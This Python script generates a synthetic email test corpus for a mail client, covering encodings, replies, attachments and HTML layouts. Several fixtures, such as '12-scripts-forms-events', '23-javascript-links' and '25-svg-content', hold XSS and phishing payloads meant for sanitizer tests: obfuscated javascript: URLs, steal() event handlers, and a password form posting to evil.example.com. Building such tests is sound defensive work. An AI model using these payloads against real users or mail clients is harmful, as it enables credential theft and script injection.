#!/usr/bin/env python3
"""Writes the synthetic test corpus into TestCorpus/emails/.

Every message here is invented for Swiftmail's tests; nothing is copied from real mail.
Run: python3 TestCorpus/generate.py
"""
import base64
import hashlib
import os
from email import charset as email_charset
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.message import Message
from email.header import Header
from email.utils import formataddr

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "emails")

# A 2x2 PNG.
PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAFklEQVR4nGP8z8DwnwEIGBkZGBgYAAAZBAP/ShkNnQAAAABJRU5ErkJggg=="
)


def headers(msg, subject, sender="Alex Rivera <alex@example.com>", to="me@example.com", date="Tue, 06 Oct 2026 13:31:00 +0000"):
    msg["From"] = sender
    msg["To"] = to
    msg["Subject"] = subject
    msg["Date"] = date
    msg["Message-ID"] = f"<{hashlib.md5(subject.encode()).hexdigest()[:12]}@corpus.example.com>"
    msg["MIME-Version"] = "1.0"
    return msg


def write(name, msg):
    data = msg.as_bytes() if isinstance(msg, Message) else msg
    with open(os.path.join(OUT, name), "wb") as handle:
        handle.write(data)


def html_message(subject, html, plain=None, **kwargs):
    if plain is None:
        return headers(MIMEText(html, "html", "utf-8"), subject, **kwargs)
    alt = MIMEMultipart("alternative")
    alt.attach(MIMEText(plain, "plain", "utf-8"))
    alt.attach(MIMEText(html, "html", "utf-8"))
    return headers(alt, subject, **kwargs)


def main():
    os.makedirs(OUT, exist_ok=True)

    write("01-newsletter-table.eml", html_message("Weekly digest: 5 things worth reading", """
<html><head><style>.btn{background:#1a73e8;color:#fff;padding:10px 16px;border-radius:4px}</style></head>
<body bgcolor="#f4f4f4" style="margin:0">
<table width="600" align="center" cellpadding="0" cellspacing="0" bgcolor="#ffffff" style="font-family:Helvetica">
<tr><td style="padding:24px"><img src="https://newsletter.example.com/logo.png" width="120" height="40" alt="Digest"></td></tr>
<tr><td style="padding:0 24px;color:#333">
<h1 style="font-size:22px">This week</h1>
<p>Five links we enjoyed, from bread baking to orbital mechanics.</p>
<p><a class="btn" href="https://newsletter.example.com/read?id=42">Read the issue</a></p>
<table width="100%"><tr><td width="50%"><img src="https://newsletter.example.com/a.jpg" width="260"></td>
<td width="50%"><img src="http://cdn.example.net/b.jpg" width="260"></td></tr></table>
</td></tr>
<tr><td style="padding:24px;font-size:11px;color:#999">You get this because you subscribed.
<a href="https://newsletter.example.com/unsubscribe">Unsubscribe</a></td></tr>
</table>
<img src="https://track.example.com/open.gif?u=123" width="1" height="1" alt="">
</body></html>""", plain="This week: five links we enjoyed. Read: https://newsletter.example.com/read?id=42"))

    flowed = MIMEText(
        "Hi,\r\n\r\nThis paragraph is long and was wrapped by the sender's mail client using \r\n"
        "format=flowed, so these soft line breaks should join into one paragraph \r\n"
        "when shown.\r\n\r\nSee https://example.org/docs and write to help@example.org.\r\n\r\n"
        "On Mon, 5 Oct 2026 at 09:00, Sam Kim <sam@example.com> wrote:\r\n"
        "> Can you check the numbers before Friday? The sheet is \r\n"
        "> in the shared folder.\r\n>\r\n> Thanks\r\n",
        "plain", "utf-8",
    )
    flowed.set_param("format", "flowed")
    write("02-plain-flowed.eml", headers(flowed, "Re: Numbers"))

    related = MIMEMultipart("related")
    related.attach(MIMEText('<p>Here is the chart:</p><p><img src="cid:chart@corpus"></p><p>And the logo <img src="cid:logo@corpus" width="16"></p>', "html", "utf-8"))
    for cid in ["chart@corpus", "logo@corpus"]:
        image = MIMEImage(PNG, "png")
        image.add_header("Content-ID", f"<{cid}>")
        image.add_header("Content-Disposition", "inline", filename=cid.split("@")[0] + ".png")
        related.attach(image)
    write("03-inline-images.eml", headers(related, "Chart for the review"))

    invite = MIMEMultipart("mixed")
    alt = MIMEMultipart("alternative")
    alt.attach(MIMEText("You're invited: Design review, Thu 8 Oct 2026 15:00 UTC", "plain", "utf-8"))
    alt.attach(MIMEText("<p>You're invited: <b>Design review</b></p>", "html", "utf-8"))
    cal = MIMEText(
        "BEGIN:VCALENDAR\r\nVERSION:2.0\r\nMETHOD:REQUEST\r\nBEGIN:VEVENT\r\nUID:review-1@corpus\r\n"
        "DTSTART:20261008T150000Z\r\nDTEND:20261008T160000Z\r\nSUMMARY:Design review\r\n"
        "ORGANIZER:mailto:alex@example.com\r\nATTENDEE:mailto:me@example.com\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n",
        "calendar", "utf-8")
    cal.set_param("method", "REQUEST")
    alt.attach(cal)
    invite.attach(alt)
    ics = MIMEApplication(cal.get_payload(decode=True), "ics", name="invite.ics")
    ics.add_header("Content-Disposition", "attachment", filename="invite.ics")
    invite.attach(ics)
    write("04-calendar-invite.eml", headers(invite, "Invitation: Design review"))

    write("05-rtl-hebrew.eml", html_message("שלום עולם", '<div dir="rtl"><p>שלום! זהו מסר בעברית עם <b>הדגשה</b> ומספר 2026.</p></div>',
                                            plain="שלום! זהו מסר בעברית."))
    write("06-rtl-arabic.eml", html_message("مرحبا", '<div dir="rtl"><p>مرحبا بكم في النشرة الشهرية.</p></div>'))

    latin = MIMEText("Café crème, déjà vu, naïve façade.\n", "plain", "iso-8859-1")
    write("07-iso-8859-1.eml", headers(latin, "Réunion à 15h"))

    sjis = MIMEText("こんにちは。会議は金曜日です。\n", "plain", "shift_jis")
    write("08-shift-jis.eml", headers(sjis, "会議のお知らせ"))

    rows = "\n".join(
        f'<tr><td style="padding:4px;border-bottom:1px solid #eee">Row {i}</td><td>{"lorem ipsum dolor sit amet " * 6}</td></tr>'
        for i in range(6000)
    )
    write("09-huge-html.eml", html_message("Export: 6,000 rows", f"<table>{rows}</table>"))

    many = MIMEMultipart("mixed")
    many.attach(MIMEText("Twenty files attached.", "plain", "utf-8"))
    for i in range(20):
        part = MIMEApplication(f"file {i}\n".encode() * 50, "octet-stream")
        part.add_header("Content-Disposition", "attachment", filename=f"file-{i:02d}.txt")
        many.attach(part)
    write("10-twenty-attachments.eml", headers(many, "20 attachments"))

    write("11-long-thread-nested-quotes.eml", html_message("Re: Re: Re: Plans", """
<div dir="ltr">Works for me. See you then.</div><br>
<div class="gmail_quote"><div dir="ltr" class="gmail_attr">On Mon, 5 Oct 2026 at 18:00, Sam Kim &lt;sam@example.com&gt; wrote:<br></div>
<blockquote class="gmail_quote" style="margin:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex">
<div dir="ltr">How about Thursday?</div><br>
<div class="gmail_quote"><div dir="ltr" class="gmail_attr">On Mon, 5 Oct 2026 at 12:00, Alex Rivera &lt;alex@example.com&gt; wrote:<br></div>
<blockquote class="gmail_quote" style="margin:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex">
<div dir="ltr">When are you free?</div></blockquote></div></blockquote></div>"""))

    write("12-scripts-forms-events.eml", html_message("Account notice", """
<html><head><script>alert('x')</script><meta http-equiv="refresh" content="0;url=https://evil.example.com">
<base href="https://evil.example.com/"><link rel="import" href="https://evil.example.com/x.html">
<link rel="stylesheet" href="https://evil.example.com/s.css"></head>
<body onload="steal()">
<p onclick="steal()" onmouseover="steal()">Click <a href="javascript:steal()">here</a> or <a href=" JaVaScRiPt:steal()">here</a>.</p>
<form action="https://evil.example.com/login" method="post"><input name="password" type="password"><button>Sign in</button></form>
<iframe src="https://evil.example.com/frame"></iframe>
<object data="https://evil.example.com/x.swf"></object><embed src="https://evil.example.com/x.swf">
<img src="x" onerror="steal()">
<svg onload="steal()"><script>steal()</script></svg>
<a href="vbscript:msgbox(1)">vb</a>
<div style="background:url(javascript:steal())">styled</div>
</body></html>"""))

    write("13-apple-mail-reply.eml", html_message("Re: Photos", """
<html><body><div>Love them, thanks!</div><div><br><blockquote type="cite"><div>On Oct 5, 2026, at 20:15, Priya Patel &lt;priya@example.com&gt; wrote:</div>
<br><div><div>Here are the photos from the trip.</div></div></blockquote></div></body></html>"""))

    write("14-outlook-reply.eml", html_message("RE: Budget", """
<html><body><div>Approved.</div>
<div id="appendonsend"></div><hr style="display:inline-block;width:98%">
<div id="divRplyFwdMsg" dir="ltr"><font face="Calibri"><b>From:</b> Jordan Okafor &lt;jordan@example.com&gt;<br>
<b>Sent:</b> Monday, October 5, 2026 9:12 AM<br><b>To:</b> Me<br><b>Subject:</b> Budget</font></div>
<div>Please approve the Q4 budget.</div></body></html>"""))

    write("15-gmail-forward.eml", html_message("Fwd: Itinerary", """
<div dir="ltr">FYI<br><br><div class="gmail_quote"><div dir="ltr" class="gmail_attr">---------- Forwarded message ---------<br>
From: <strong class="gmail_sendername">Travel Desk</strong> <span>&lt;travel@example.com&gt;</span><br>Date: Mon, 5 Oct 2026 at 08:00<br>
Subject: Itinerary<br>To: &lt;me@example.com&gt;<br></div><br><br><div>Flight AB123 departs 10:40.</div></div></div>"""))

    write("16-plain-reply-quoted.eml", headers(MIMEText(
        "Sounds good.\n\nOn Tue, 6 Oct 2026 at 10:00, Mina Novak <mina@example.com> wrote:\n> Shall we meet at noon?\n> > Earlier question\n", "plain", "utf-8"),
        "Re: Lunch"))

    emoji = MIMEText("Party time 🎉", "plain", "utf-8")
    headers(emoji, "")
    emoji.replace_header("Subject", Header("🎉 Ünïcödé subject über alles", "utf-8").encode())
    emoji.replace_header("From", formataddr((str(Header("Zoë Ångström", "utf-8")), "zoe@example.com")))
    write("17-utf8-emoji-subject.eml", emoji)

    named = MIMEMultipart("mixed")
    named.attach(MIMEText("Report attached.", "plain", "utf-8"))
    pdf = MIMEApplication(b"%PDF-1.4\n%fake\n", "pdf")
    pdf.add_header("Content-Disposition", "attachment", filename=("utf-8", "", "résumé – 2026.pdf"))
    named.attach(pdf)
    write("18-rfc2231-filename.eml", headers(named, "CV"))

    qp = MIMEText('<p style="color:#333">Café =E2=80=94 quoted-printable body with a long line that must be soft-wrapped by the encoder because it exceeds seventy-six characters.</p>', "html", "utf-8")
    email_charset.add_charset("utf-8", email_charset.QP, email_charset.QP, "utf-8")
    qp = headers(MIMEText('<p style="color:#333">Café — quoted-printable body with a long line that must be soft-wrapped by the encoder because it exceeds seventy-six characters.</p>', "html", "utf-8"), "QP body")
    write("19-quoted-printable-html.eml", qp)
    email_charset.add_charset("utf-8", email_charset.SHORTEST, email_charset.BASE64, "utf-8")

    write("20-simple-html.eml", html_message("Quick question", '<div dir="ltr">Do you have the <b>slides</b> from yesterday?<div><br></div><div>– Chen</div></div>'))

    write("21-css-background-remote.eml", html_message("Sale", """
<html><head><style>.hero{background-image:url('https://shop.example.com/hero.jpg');height:200px}</style></head>
<body><div class="hero">Big sale</div><table background="https://shop.example.com/bg.png"><tr><td>Deals</td></tr></table></body></html>"""))

    write("22-tracker-pixels.eml", html_message("Your receipt", """
<p>Thanks for your order.</p>
<img src="https://shop.example.com/product.jpg" width="200" height="200">
<img src="https://pixel.example.com/o.gif" width="1" height="1">
<img src="https://pixel.example.com/o2.gif" style="display:none">
<img src="https://pixel.example.com/o3.gif" style="width:0;height:0">
<img src="https://open.mailtrack.example/x.png" style="visibility:hidden">
<img src="https://www.google-analytics.com/collect?v=1" width="2" height="2">"""))

    write("23-javascript-links.eml", html_message("Links", """
<a href="java&#x09;script:alert(1)">tab</a> <a href="&#106;avascript:alert(1)">entity</a>
<a href="https://example.com/ok">ok</a> <a href="mailto:hi@example.com">mail</a>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAFklEQVR4nGP8z8DwnwEIGBkZGBgYAAAZBAP/ShkNnQAAAABJRU5ErkJggg==">
<a href="data:text/html,<script>alert(1)</script>">data html</a>"""))

    write("24-meta-refresh-base.eml", html_message("Redirect", """
<html><head><meta http-equiv="Refresh" content="1; URL=https://evil.example.com"><base target="_blank" href="https://evil.example.com"></head>
<body><p>Nothing to see.</p></body></html>"""))

    write("25-svg-content.eml", html_message("Badge", """
<svg width="40" height="40" onload="x()"><circle cx="20" cy="20" r="18" fill="green"/><script>x()</script>
<a xlink:href="javascript:x()"><text x="5" y="25">ok</text></a></svg>"""))

    write("26-iframe-object-embed.eml", html_message("Video", """
<p>Watch:</p><iframe width="560" height="315" src="https://video.example.com/embed/1"></iframe>
<object data="https://video.example.com/x"><param name="movie" value="x"></object><embed src="https://video.example.com/y">
<applet code="X.class"></applet><frameset><frame src="https://evil.example.com"></frameset>
<video src="https://video.example.com/v.mp4" poster="https://video.example.com/p.jpg"></video>"""))

    cp1252 = MIMEText("", "plain")
    cp1252.set_payload("“Smart quotes” and — dashes …".encode("cp1252"))
    cp1252.replace_header("Content-Type", 'text/plain; charset="windows-1252"')
    cp1252["Content-Transfer-Encoding"] = "8bit"
    write("27-windows-1252.eml", headers(cp1252, "Smart quotes"))

    mixed = MIMEMultipart("mixed")
    mixed.attach(MIMEText("Notes below and in the attachment.", "plain", "utf-8"))
    notes = MIMEText("attachment text\n", "plain", "utf-8")
    notes.add_header("Content-Disposition", "attachment", filename="notes.txt")
    mixed.attach(notes)
    write("28-text-attachment.eml", headers(mixed, "Notes"))

    outer = MIMEMultipart("mixed")
    outer.attach(MIMEText("Forwarding as attachment.", "plain", "utf-8"))
    inner = headers(MIMEText("The original message.", "plain", "utf-8"), "Original", sender="Omar Haddad <omar@example.com>")
    rfc = MIMEBase("message", "rfc822")
    rfc.set_payload([inner])
    rfc.add_header("Content-Disposition", "attachment", filename="original.eml")
    outer.attach(rfc)
    write("29-message-rfc822.eml", headers(outer, "Fwd: Original"))

    empty = MIMEText("", "plain", "utf-8")
    write("30-empty-body.eml", headers(empty, "Subject only"))

    footers = MIMEMultipart("mixed")
    footers.attach(MIMEText("<p>Main body</p>", "html", "utf-8"))
    footers.attach(MIMEText("<p style='font-size:11px'>List footer: unsubscribe at https://lists.example.org</p>", "html", "utf-8"))
    write("31-multiple-html-parts.eml", headers(footers, "[list] Topic"))

    write("32-dark-colors.eml", html_message("Night theme", '<body style="background:#111;color:#eee"><p style="color:#eee">Light text on a dark background.</p></body>'))


if __name__ == "__main__":
    main()
